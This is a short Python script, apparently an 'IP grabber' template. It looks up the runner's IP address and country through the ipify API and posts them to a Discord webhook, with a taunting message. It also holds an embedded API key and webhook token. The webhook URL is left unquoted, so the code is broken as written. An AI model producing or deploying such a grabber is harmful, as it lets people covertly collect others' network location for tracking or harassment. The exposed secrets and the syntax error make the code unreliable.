import requests


# website which shows your ip
ip = requests.get('https://geo.ipify.org/api/v2/country?apiKey=at_bQKbgkAb40BBDwDFsLQLJX5Ctxsyk', )
ipcon = ip.content


# your webhook here
url = https://discord.com/api/webhooks/1303213422095368203/Up37ogLxkO2u7Wl7FFMftsVn09oc3g0f5Yo_PKmBQFfbgLgctgRU8_cXu_quiP8wbwyw

# this is what will be sent
data = {
    "content": ":nerd: here's ur ip : "
}
data2 = {
    "content": ipcon[7:21]
}
data3 = {
    "content": ipcon[45:70]

}
def send_mesg():
    requests.post(url, data=data)
    requests.post(url, data=data2)
    requests.post(url, data=data3)


send_mesg()
